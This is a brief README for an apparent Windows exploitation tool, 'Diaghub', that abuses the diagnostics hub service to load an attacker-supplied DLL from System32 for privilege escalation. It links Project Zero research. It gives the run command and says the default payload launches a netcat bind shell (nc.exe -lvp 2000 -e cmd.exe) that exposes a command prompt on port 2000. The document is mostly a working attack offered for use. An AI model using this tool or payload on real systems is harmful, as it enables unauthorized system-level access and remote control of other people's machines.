# Diaghub

Loads a custom dll in system32 via diaghub.

* https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1
* https://vulndev.io/2019/03/howto_diaghub.html

Example:

Get the dll via some other vulnerability into C:\Windows\System32 and run:
```
diaghub.exe c:\\ProgramData\\ xct.dll
```
The default payload will run `C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe`